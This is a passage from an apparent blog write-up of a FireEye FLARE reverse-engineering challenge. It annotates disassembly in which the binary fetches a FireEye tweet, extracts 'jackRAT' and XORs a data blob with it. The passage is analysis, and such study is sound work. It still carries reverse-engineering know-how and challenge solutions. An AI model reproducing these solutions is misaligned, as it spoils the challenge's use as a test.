&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:004019&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A1&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;ebp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;var_18&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;],&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;300036h&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:004019&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A8&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;ebp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;var_14&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;],&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;38h&lt;/span&gt;   &lt;span style=&#34;color: #586E75&#34;&gt;; https://twitter.com/FireEye/status/484033515538116608&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:004019&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;AF&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #B58900&#34;&gt;ds&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;InternetOpenUrlW&lt;/span&gt; &lt;span style=&#34;color: #586E75&#34;&gt;; open URL&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:004019&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B5&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;ebp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;hInternet&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;],&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;eax&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:004019&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;BB&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;cmp&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;eax&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;ebx&lt;/span&gt;        &lt;span style=&#34;color: #586E75&#34;&gt;; ebx == 0x00 - check if eax is zero&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:004019&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;BD&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;jz&lt;/span&gt;      &lt;span style=&#34;color: #268BD2&#34;&gt;loc_4018D4&lt;/span&gt;      &lt;span style=&#34;color: #586E75&#34;&gt;; if (eax == 0 ) jump to loc_4018D4 (return immedi&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://msdn.microsoft.com/en-us/library/windows/desktop/aa385098%28v=vs.85%29.aspx&#34; target=&#34;_blank&#34;&gt;InternetOpenUrl&lt;/a&gt; opens a handle to a resource. &lt;code&gt;dwFlags&lt;/code&gt; is set to &lt;code&gt;0x00400100&lt;/code&gt;. I could not find the exact meaning of this flag value. However, according to &lt;a href=&#34;http://msdn.microsoft.com/en-us/library/windows/desktop/aa383661%28v=vs.85%29.aspx&#34; target=&#34;_blank&#34;&gt;this page&lt;/a&gt; it could be the &lt;code&gt;OR&lt;/code&gt; of two flags (does it work that way?):&lt;/p&gt;

&lt;p&gt;


    

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;0x00400100 flag&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt; 
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;1
2
3
4
5&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;INTERNET_FLAG_KEEP_CONNECTION:&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;0x00400000&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;Uses&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;keep-alive&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;semantics,&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;available,&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;the&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;connection.&lt;/span&gt;

&lt;span style=&#34;color: #93A1A1&#34;&gt;INTERNET_FLAG_PRAGMA_NOCACHE:&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;0x00000100&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;Forces&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;the&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;request&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;to&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;be&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;resolved&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;by&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;the&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;origin&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;server.&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;Lines 9 to 35 are saving the URL, we know what it is without even looking at it. We have seen it in Wireshark before. The URL is &lt;code&gt;https://twitter.com/FireEye/status/484033515538116608&lt;/code&gt;.&lt;/p&gt;

&lt;!-- ![Fireeye tweet](/images/2014/flare/7-2.jpg &#34;Fireeye tweet&#34;) --&gt;

&lt;p&gt;&lt;blockquote class=&#34;twitter-tweet&#34;&gt;&lt;p lang=&#34;en&#34; dir=&#34;ltr&#34;&gt;The Service You Can’t Refuse: A Secluded HijackRAT &lt;a href=&#34;http://t.co/ckx18JHdkb&#34;&gt;http://t.co/ckx18JHdkb&lt;/a&gt; &lt;a href=&#34;https://twitter.com/hashtag/infosec?src=hash&#34;&gt;#infosec&lt;/a&gt; &lt;a href=&#34;https://twitter.com/hashtag/malware?src=hash&#34;&gt;#malware&lt;/a&gt;&lt;/p&gt;&amp;mdash; FireEye (@FireEye) &lt;a href=&#34;https://twitter.com/FireEye/status/484033515538116608&#34;&gt;July 1, 2014&lt;/a&gt;&lt;/blockquote&gt;
&lt;script async src=&#34;//platform.twitter.com/widgets.js&#34; charset=&#34;utf-8&#34;&gt;&lt;/script&gt;&lt;/p&gt;

&lt;p&gt;Line 37 saves return value which is a &amp;ldquo;valid handle to the URL if the connection is successfully established, or NULL if the connection fails&amp;rdquo;. Then it is checked for being NULL, if so we will jump to &lt;code&gt;loc_4018D4&lt;/code&gt; and function returns immediately. If we have a handle to the tweet, execution continues.&lt;/p&gt;

&lt;p&gt;


    

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;loc 4019D6 - InternetReadFile&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt; 
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:004019&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;D6&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;loc_4019D6&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:004019&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;D6&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;lea&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;edx&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;ebp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;dwNumberOfBytesRead&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:004019&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;DC&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;push&lt;/span&gt;    &lt;span style=&#34;color: #B58900&#34;&gt;edx&lt;/span&gt;             &lt;span style=&#34;color: #586E75&#34;&gt;; lpdwNumberOfBytesRead - Pointer to variable that will hold number of bytes read&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:004019&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;DD&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;push&lt;/span&gt;    &lt;span style=&#34;color: #2AA198&#34;&gt;1000h&lt;/span&gt;           &lt;span style=&#34;color: #586E75&#34;&gt;; dwNumberOfBytesToRead - Number of bytes to read 0x1000 == 4096&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:004019&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;E2&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;lea&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;ecx&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;ebp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;Buffer&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:004019&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;E8&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;push&lt;/span&gt;    &lt;span style=&#34;color: #B58900&#34;&gt;ecx&lt;/span&gt;             &lt;span style=&#34;color: #586E75&#34;&gt;; lpBuffer - Buffer to hold the retrieved data&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:004019&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;E9&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;push&lt;/span&gt;    &lt;span style=&#34;color: #B58900&#34;&gt;eax&lt;/span&gt;             &lt;span style=&#34;color: #586E75&#34;&gt;; hFile - Handle from previous InternetOpenUrl call&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:004019&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;EA&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #B58900&#34;&gt;ds&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;InternetReadFile&lt;/span&gt; &lt;span style=&#34;color: #586E75&#34;&gt;; Reading the first 4KBs of the tweet&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:004019&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;F0&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;edx&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;ebp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;dwNumberOfBytesRead&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:004019&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;F6&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;lea&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;eax&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;edi&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;edx&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:004019&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;F9&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;push&lt;/span&gt;    &lt;span style=&#34;color: #B58900&#34;&gt;eax&lt;/span&gt;             &lt;span style=&#34;color: #586E75&#34;&gt;; size_t&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:004019&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;FA&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;??2@YAPAXI@Z&lt;/span&gt;    &lt;span style=&#34;color: #586E75&#34;&gt;; operator new(uint)&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:004019&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;FF&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;push&lt;/span&gt;    &lt;span style=&#34;color: #B58900&#34;&gt;edi&lt;/span&gt;             &lt;span style=&#34;color: #586E75&#34;&gt;; size_t&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A00&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;esi&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;eax&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A02&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;push&lt;/span&gt;    &lt;span style=&#34;color: #B58900&#34;&gt;ebx&lt;/span&gt;             &lt;span style=&#34;color: #586E75&#34;&gt;; void *&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A03&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;push&lt;/span&gt;    &lt;span style=&#34;color: #B58900&#34;&gt;esi&lt;/span&gt;             &lt;span style=&#34;color: #586E75&#34;&gt;; void *&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A04&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;_memcpy&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A09&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;ecx&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;ebp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;dwNumberOfBytesRead&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A0F&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;push&lt;/span&gt;    &lt;span style=&#34;color: #B58900&#34;&gt;ecx&lt;/span&gt;             &lt;span style=&#34;color: #586E75&#34;&gt;; size_t&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A10&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;lea&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;edx&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;ebp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;Buffer&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A16&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;push&lt;/span&gt;    &lt;span style=&#34;color: #B58900&#34;&gt;edx&lt;/span&gt;             &lt;span style=&#34;color: #586E75&#34;&gt;; void *&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A17&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;lea&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;eax&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;esi&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;edi&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A1A&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;push&lt;/span&gt;    &lt;span style=&#34;color: #B58900&#34;&gt;eax&lt;/span&gt;             &lt;span style=&#34;color: #586E75&#34;&gt;; void *&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A1B&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;_memcpy&lt;/span&gt;         &lt;span style=&#34;color: #586E75&#34;&gt;; Copy retrieved data to [eax]&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A20&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;push&lt;/span&gt;    &lt;span style=&#34;color: #B58900&#34;&gt;ebx&lt;/span&gt;             &lt;span style=&#34;color: #586E75&#34;&gt;; void *&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A21&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;??3@YAXPAX@Z&lt;/span&gt;    &lt;span style=&#34;color: #586E75&#34;&gt;; operator delete(void *)&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A26&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;eax&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;ebp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;dwNumberOfBytesRead&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A2C&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;add&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;esp&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;20h&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A2F&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;add&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;edi&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;eax&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A31&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;ebx&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;esi&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A33&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;test&lt;/span&gt;    &lt;span style=&#34;color: #B58900&#34;&gt;eax&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;eax&lt;/span&gt;         &lt;span style=&#34;color: #586E75&#34;&gt;; Keep reading until NumberofBytesRead is zero&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A35&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;jnz&lt;/span&gt;     &lt;span style=&#34;color: #268BD2&#34;&gt;short&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;loc_4019D0&lt;/span&gt; &lt;span style=&#34;color: #586E75&#34;&gt;; if (NumberofBytesRead !=0 ) jump to loc_4019D0 to continue reading&lt;/span&gt;

&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:004019&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;D0&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;loc_4019D0&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:004019&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;D0&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;eax&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;ebp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;hInternet&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color: #586E75&#34;&gt;; Back to the top to continue reading&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://msdn.microsoft.com/en-us/library/windows/desktop/aa385103%28v=vs.85%29.aspx&#34; target=&#34;_blank&#34;&gt;InternetReadFile&lt;/a&gt; retrieves the tweet. A buffer is created to hold the retrieved data. Documentation says &amp;ldquo;[a] normal read retrieves the specified dwNumberOfBytesToRead for each call to InternetReadFile until the end of the file is reached. To ensure all data is retrieved, an application must continue to call the InternetReadFile function until the function returns TRUE and the lpdwNumberOfBytesRead parameter equals zero.&amp;rdquo; This is happening in lines 31-35. We keep reading until &lt;code&gt;NumberofBytesRead&lt;/code&gt; is zero.&lt;/p&gt;

&lt;p&gt;After we are done, the jump in line 32 is not taken and we land here:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://parsiya.net/images/2014/flare/7-21.jpg&#34; alt=&#34;Sifting through the tweet&#34; title=&#34;Sifting through the tweet&#34; /&gt;&lt;/p&gt;

&lt;p&gt;We retrieved the tweet. Now &lt;a href=&#34;http://msdn.microsoft.com/en-us/library/windows/desktop/bb773436%28v=vs.85%29.aspx&#34; target=&#34;_blank&#34;&gt;strstr&lt;/a&gt; is called to find the first instance of &lt;code&gt;Secluded Hi&lt;/code&gt; in the tweet. The return value is a pointer to the start of &lt;code&gt;Secluded HijackRAT http://t.co/ckx18JHdkb ...&lt;/code&gt;. The application adds &lt;code&gt;0x0B&lt;/code&gt; or 11 to the start of the string to skip &lt;code&gt;Secluded Hi&lt;/code&gt; and point to &lt;code&gt;jackRAT http://t.co/ckx18JHdkb ...&lt;/code&gt;. A new 8 character buffer is created and passed to &lt;a href=&#34;http://msdn.microsoft.com/en-us/library/xdsywd25.aspx&#34; target=&#34;_blank&#34;&gt;strncpy&lt;/a&gt;. &lt;code&gt;strncpy&lt;/code&gt; is called to copy 7 bytes from the start to the newly created buffer which will be &lt;code&gt;jackRAT&lt;/code&gt;. The rest is simple, &lt;code&gt;jackRAT&lt;/code&gt; is xor-ed with the blob and finally &lt;a href=&#34;http://msdn.microsoft.com/en-us/library/windows/desktop/aa384350%28v=vs.85%29.aspx&#34; target=&#34;_blank&#34;&gt;InternetCloseHandle&lt;/a&gt; is called three times to close the three function calls.&lt;/p&gt;

